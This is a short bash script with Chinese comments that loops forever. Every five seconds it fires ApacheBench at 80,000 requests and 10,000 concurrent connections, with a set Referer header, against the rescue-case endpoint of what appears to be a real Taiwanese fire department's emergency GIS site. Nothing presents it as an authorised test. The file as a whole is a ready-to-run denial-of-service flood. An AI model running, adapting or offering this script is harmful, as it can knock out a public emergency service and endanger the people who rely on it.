#!/bin/bash

while true; do
    # 在每次循环开始之前等待5秒
    sleep 5

    # 执行ab命令
    ab -n 80000 -c 10000 -H "Referer: https://gis.fdkc.gov.tw/rescue" "https://gis.fdkc.gov.tw/rescue/getnowcase/json?getalls=1"
done
